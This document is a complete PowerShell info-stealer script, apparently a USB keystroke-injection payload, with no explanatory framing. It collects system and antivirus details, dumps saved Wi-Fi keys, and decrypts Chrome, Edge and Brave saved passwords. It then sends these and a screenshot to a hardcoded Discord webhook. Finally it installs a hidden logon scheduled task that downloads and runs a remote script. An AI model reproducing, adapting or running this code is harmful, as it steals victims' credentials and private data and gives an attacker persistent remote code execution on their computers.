
try {
    $out = "$env:TEMP\wifi_dump.txt"
    "=== ACID BURN ===" | Out-File $out
    "Host: $env:COMPUTERNAME" | Out-File $out -Append
    "User: $env:USERNAME" | Out-File $out -Append
    "Domain: $env:USERDOMAIN" | Out-File $out -Append
    "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)" | Out-File $out -Append
    "Arch: $env:PROCESSOR_ARCHITECTURE" | Out-File $out -Append
    "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'}).IPAddress -join ', ')" | Out-File $out -Append
    "" | Out-File $out -Append

    "--- AV ---" | Out-File $out -Append
    $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
    if ($av) { $av.displayName | Out-File $out -Append } else { "(none)" | Out-File $out -Append }
    "" | Out-File $out -Append

    "--- WIFI ---" | Out-File $out -Append
    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }
    if ($profiles) {
        foreach ($p in $profiles) {
            $details = netsh wlan show profile name="$p" key=clear
            $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
            if ($key) { "$p : $key" | Out-File $out -Append }
        }
    } else { "(none)" | Out-File $out -Append }
    "" | Out-File $out -Append

    # --- LOAD SQLITE ---
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    $interopDll = "$env:TEMP\SQLite.Interop.dll"
    if (-not (Test-Path $sqliteDll)) {
        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing } catch { }
    }
    if (-not (Test-Path $interopDll)) {
        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/SQLite.Interop.dll" -OutFile $interopDll -UseBasicParsing } catch { }
    }
    $sqliteLoaded = $false
    if (Test-Path $sqliteDll) {
        try {
            [System.Reflection.Assembly]::LoadFrom($sqliteDll) | Out-Null
            $sqliteLoaded = $true
        } catch { }
    }

    "--- BROWSER PASSWORDS ---" | Out-File $out -Append
    Add-Type -AssemblyName System.Security

    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }

    foreach ($b in $browsers.Keys) {
        $base = $browsers[$b]
        if (-not (Test-Path $base)) { continue }
        $state = Join-Path $base "Local State"
        if (-not (Test-Path $state)) { continue }

        $json = Get-Content $state -Raw | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        $encKey = $encKey[5..($encKey.Length-1)]
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, "CurrentUser")

        "== $b ==" | Out-File $out -Append

        $profilesDir = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
        foreach ($pd in $profilesDir) {
            $loginDb = Join-Path $pd.FullName "Login Data"
            if (-not (Test-Path $loginDb)) { continue }
            $tmp = "$env:TEMP\ab_login.db"
            Copy-Item $loginDb $tmp -Force

            if ($sqliteLoaded) {
                try {
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                    $reader = $cmd.ExecuteReader()
                    while ($reader.Read()) {
                        $u = $reader.GetString(1)
                        $pEnc = $reader.GetValue(2)
                        $pStr = ""
                        if ($pEnc -is [byte[]] -and $pEnc.Length -gt 3) {
                            try {
                                $blob = $pEnc
                                if ($blob[0] -eq 118 -and $blob[1] -eq 49 -and $blob[2] -eq 48) {
                                    $blob = $blob[3..($blob.Length-1)]
                                }
                                $pDec = [System.Security.Cryptography.ProtectedData]::Unprotect($blob, $null, "CurrentUser")
                                $pStr = [System.Text.Encoding]::UTF8.GetString($pDec)
                            } catch { $pStr = "(fail)" }
                        }
                        if ($u) { "$($reader.GetString(0)) | $u | $pStr" | Out-File $out -Append }
                    }
                    $conn.Close()
                } catch {
                    "SQLite error: $_" | Out-File $out -Append
                }
            } else {
                "SQLite DLL not loaded" | Out-File $out -Append
            }
        }
        "" | Out-File $out -Append
    }

    $body = Get-Content $out -Raw
    if ([string]::IsNullOrWhiteSpace($body)) { $body = "(empty)" }
    $body = $body -replace "\\", "/"
    $body = $body.Substring(0, [Math]::Min(1900, $body.Length))

    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
    $payload = @{ content = $body } | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    Invoke-RestMethod -Uri $url -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"

    # --- SCREENSHOT ---
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $shot = "$env:TEMP\ab_shot.png"
    $bmp.Save($shot, [System.Drawing.Imaging.ImageFormat]::Png)
    $gfx.Dispose(); $bmp.Dispose()

    Add-Type -AssemblyName System.Net.Http
    $client = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $fs = [System.IO.File]::OpenRead($shot)
    $fc = New-Object System.Net.Http.StreamContent($fs)
    $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
    $content.Add($fc, "file", "screen.png")
    $client.PostAsync($url, $content).Result | Out-Null
    $fs.Close(); $client.Dispose()

    # --- PERSISTENCE ---
    $cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
    schtasks /create /tn "AcidBurn" /tr $cmd /sc onlogon /f 2>$null
}
catch {
    $_ | Out-File "$env:TEMP\ab_error.txt"
}
